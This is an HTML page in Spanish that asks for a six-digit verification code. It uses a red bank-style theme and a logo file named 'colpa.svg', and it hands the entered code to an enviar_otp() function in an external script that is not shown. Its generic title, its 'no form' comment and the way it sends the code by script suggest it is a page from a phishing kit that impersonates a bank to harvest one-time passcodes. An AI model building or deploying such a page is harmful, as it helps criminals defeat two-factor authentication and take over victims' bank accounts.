<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Document</title>
    <link rel="stylesheet" href="/css/davi.css">

    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
	<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   	<script type="text/javascript" src="/scripts/functions2.js"></script>
	<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet" />
<style>
    body {
      background: #fff;
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .header {
      background: #fff;
      border-top: 3px solid #ed1c24;
      padding: 10px 0 12px 15px;
      box-sizing: border-box;
      display: flex;
      align-items: center;
      border-bottom: 2px solid #f2f2f2;
    }
    .logo {
      height: 32px;
    }
    .main-content {
      padding: 32px 28px 0 28px;
    }
    .title {
      font-size: 1.6em;
      font-weight: 700;
      color: #222;
      margin-bottom: 0.2em;
      margin-top: 0;
    }
    .underline {
      display: block;
      width: 40px;
      height: 2px;
      background: #ed1c24;
      margin-top: 8px;
      margin-bottom: 32px;
      border-radius: 3px;
    }

    /* ==== INPUT MATERIAL STYLE ==== */
    .input-group {
      margin-bottom: 40px;
      position: relative;
    }
    .input-material {
      position: relative;
      width: 100%;
    }
    .input-material .material-symbols-outlined {
      position: absolute;
      left: 0;
      top: 12px;
      color: #999;
      font-size: 20px;
      pointer-events: none;
      transition: color 0.18s;
    }
    .input-material input {
      width: 100%;
      padding: 12px 0 8px 32px;
      font-size: 1.07em;
      border: none;
      border-bottom: 1px solid #bbb;
      outline: none;
      background: transparent;
      color: #222;
      transition: border-color 0.18s;
    }
    .input-material input:focus {
      border-bottom: 2px solid #ed1c24;
    }
    .input-material label {
      position: absolute;
      top: 12px;
      left: 32px;
      color: #888;
      font-size: 1em;
      pointer-events: none;
      transition: 0.18s;
      background: #fff;
      padding: 0 4px;
    }
    .input-material input:focus + label,
    .input-material input:not(:placeholder-shown) + label {
      top: -8px;
      left: 28px;
      font-size: 0.88em;
      color: #ed1c24;
      background: #fff;
    }

    .btn-ingresar {
      width: 100%;
      padding: 14px 0 12px 0;
      background: #ed1c24;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-weight: 700;
      font-size: 1.07em;
      margin-top: 10px;
      cursor: pointer;
      transition: background 0.18s;
      box-shadow: 0 1.5px 5px rgba(255,0,0,0.05);
    }
    .btn-ingresar:hover {
      background: #c9161b;
    }

    .mensaje {
      display: none;
      color: #ed1c24;
      margin-top: 7px;
      font-size: 0.97em;
    }
    .pass {
      border: 1px solid #CCCCCC;
      border-bottom: 2px solid #bbb !important;
      border-radius: 6px;
      transition: border 0.2s;
    }
    @media (max-width: 400px) {
      .main-content {
        padding: 20px 10px 0 10px;
      }
    }
  </style>
</head>
<body>
<div class="container">
  <div class="header">
    <img src="colpa.svg" alt="Logo" class="logo">
  </div>
  <div class="main-content">
    <div class="title">Ingresa el código de verificación</div>
    <span class="underline"></span>
    <!-- SIN FORMULARIO -->
    <div class="input-group">
      <div class="input-material">
        <span class="material-symbols-outlined">lock</span>
        <input 
          type="password"
          inputmode="numeric"
          name="cDinamica"
          id="txtOTP"
          maxlength="6"
          pattern="\d{6}"
          class="pass"
          required
          placeholder=" "
          autocomplete="off"
        />
        <label for="txtOTP">Código de verifición</label>
      </div>
      <div class="mensaje">Por favor ingresa un código válido.</div>
    </div>
    <input
      type="submit"
      id="btnOTP"
      value="Ingresar"
      class="btn-ingresar"
    >
  </div>
</div>
<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>

</body>
</html>